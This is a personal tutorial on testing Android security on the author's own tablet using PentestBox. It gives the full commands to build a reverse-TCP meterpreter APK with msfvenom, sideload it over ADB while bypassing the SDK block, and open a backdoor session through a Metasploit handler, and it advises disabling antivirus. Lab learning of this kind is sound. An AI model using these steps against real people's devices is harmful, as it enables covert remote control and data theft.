# Pentesting Android using PentestBox

so, this is my quick writeup on Android pentesting. I used my Galaxy Tab A8 (model SM-X205) as the test device. Nothing too fancy, just keeping it real with what I have. The main toolkit I used for the testing part was **PentestBox.**

This isn't some high-level, corporate red team gig. It's more like me exploring how Android security works, poking around the system, playing with ADB and the consequences of installing the malicious APK file.



## Installing PentestBox

before we start, install PentestBox as our MVP for pentesting environment. you can install it via this website: [https://pentestbox.org/](https://pentestbox.org/). make sure to turn off your antivirus or whitelist the PentestBox, because it's a self-contained environment with a bunch of tools and scripts that behave a bit differently from normal windows apps.

<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

## Crafting the Payload

next, we need to craft a payload which is in this case the payload is in APK file. its because we want to install the APK file into the target. we will use msfvenom in PentestBox to craft our payload. but first, check our IP address first using this command:

```bash
ipconfig
```

<div data-full-width="false"><figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure></div>

next step is to craft the payload using msfvenom

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=<your local IP> LPORT=4444 -o 
appname.apk 
```

<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

this command will create an APK file into the directory `"D:\PentestBox\bin\metasploit-framework"` with the name of **evil.apk**.&#x20;

* `-p android/meterpreter/reverse_tcp` –  to craft a reverse\_tcp payload.  It's easier to bypass firewalls because the victim device connects back to our machine.
* `LHOST=<your local IP>` – our IP address. make sure the targeted device is in the same network.
* `LPORT=4444` – port as our listener. feel free to choose your own port.
* `-o appname.apk` – saves the generated malicious APK with your chosen name.

after the payload is crafted, install the APK into the target machine using Android Debug Bridge (ADB). if your android is using the older android version, no need to use ADB because it's already compatible with your device.&#x20;

## Installing APK into target machine using ADB&#x20;

this steps will show you if your device is showing **"not compatible with your device"** when installing the APK file. if not shown, just skip these steps.

<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

you can install first Android SDK Platform tools in this website: [https://developer.android.com/tools/releases/platform-tools](https://developer.android.com/tools/releases/platform-tools). after extracting, go to the **evil.apk** directory which is in `"D:\PentestBox\bin\metasploit-framework"` and drag the evil.apk into the SDK directory.

<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

next, we must enable USB Debugging at our target machine and connect it into our machine using USB cable.

plug in the target machine into our device. then, go to **settings > about tablet > build number** and click it several times to enable developer mode.

<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

after that, go to developer options > USB debugging and enable it.

<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

launch the powershell in the SDK directory. after that, use the command below to check whether our target machine is connected to the device or not.

```powershell
./adb devices
```

<figure><img src="../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

as we can see, the target machine is already connected to our device. pair with the target machine using the command below and then insert the pairing code. go to **settings > developer options > wireless debugging > pair device with pairing code** to retrieve your IP address, port and pairing code.

```powershell
./adb pair <target_machine_IP>:<port>
```

<figure><img src="../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

the payload is also ready to launch. after successfully paired with the target device, insert the command below to start installing the APK into the target.

```powershell
./adb install --bypass-low-target-sdk-block evil.apk
```

<figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

the target device will show like this. just click install anyway. and, YES! our payload has been installed into the target machine. click the application and allow all of the permission. for the next step, we will using msfconsole to run an exploit and gain us a backdoor and meterpreter session. launch msfconsole in the PentestBox.

```bash
msfconsole
```

<figure><img src="../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

use these commands below to run an exploit.

<pre class="language-bash"><code class="lang-bash"><strong>> use exploit/multi/handler
</strong>> set payload android/meterpreter/reverse_tcp 
> set LHOST 192.168.0.6
> set LPORT 4444
> run
</code></pre>

<figure><img src="../.gitbook/assets/WhatsApp Image 2025-04-24 at 19.14.49_913f1f1c.jpg" alt=""><figcaption></figcaption></figure>

